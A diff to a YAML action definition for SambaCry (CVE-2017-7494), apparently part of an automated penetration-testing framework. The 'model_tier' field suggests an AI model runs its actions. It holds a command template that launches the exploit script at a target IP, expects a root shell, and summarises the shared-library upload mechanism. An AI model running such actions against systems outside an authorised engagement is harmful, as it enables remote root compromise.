@@ -2,15 +2,17 @@ name: sambacry
 category: privesc
 description: SambaCry (CVE-2017-7494) for root
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 sambacry.py -t {target_ip} -e '{writable_share}' -r '{share_path}'"
-parser: null
+command_template: python3 sambacry.py -t {target_ip} -e '{writable_share}' -r '{share_path}'
+parser: generic_parser
 expected_effects:
-  - action_completed
+- sambacry_exploited
+- root_shell
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Samba 3.5.0+ with writable share: upload shared library to known path, trigger load via pipe name. Executes as smbd user (often root)."
+mechanism: 'Samba 3.5.0+ with writable share: upload shared library to known path,
+  trigger load via pipe name. Executes as smbd user (often root).'
